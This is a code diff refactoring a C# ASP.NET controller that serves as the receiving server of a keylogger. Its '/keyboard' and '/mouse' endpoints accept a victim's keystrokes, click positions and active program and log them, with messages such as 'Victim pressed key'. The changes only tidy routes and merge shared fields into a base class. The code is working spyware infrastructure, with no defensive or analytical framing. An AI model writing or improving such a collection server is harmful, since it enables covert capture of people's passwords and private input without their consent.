@@ -3,36 +3,35 @@
 namespace KeyboardHookReceiver;
 
 [ApiController]
-[Route("/api/hooks")]
 public class ReceiverController : Controller
 {
-    [HttpPost]
-    [Route("/keyboard")]
+    [HttpPost, Route("/keyboard")]
     public void ReceiveKeyboardActions(KeyboardInputDto json)
     {
         Console.WriteLine($"{json.Time} | Victim pressed key[{json.KeyCode}] in {json.Program}");
     }
 
-    [HttpPost]
-    [Route("/mouse")]
+    [HttpPost, Route("/mouse")]
     public void ReceiveMouseActions(MouseClickPosInputDto json)
     {
         Console.WriteLine($"{json.Time} | Victim {json.clickSide}Clicked at pos({json.X}, {json.Y}) in {json.Program}");
     }
 }
 
-public class MouseClickPosInputDto
+public abstract class BaseInputInfo
 {
     public string? Time { get; set; }
+    public string? Program { get; set; }
+}
+
+public class MouseClickPosInputDto : BaseInputInfo
+{
     public int X { get; set; }
     public int Y { get; set; }
-    public string? Program { get; set; }
     public string? clickSide { get; set; }
 }
 
-public class KeyboardInputDto
+public class KeyboardInputDto : BaseInputInfo
 {
-    public string? Time { get; set; }
-    public string? Program { get; set; }
     public int KeyCode { get; set; }
 }
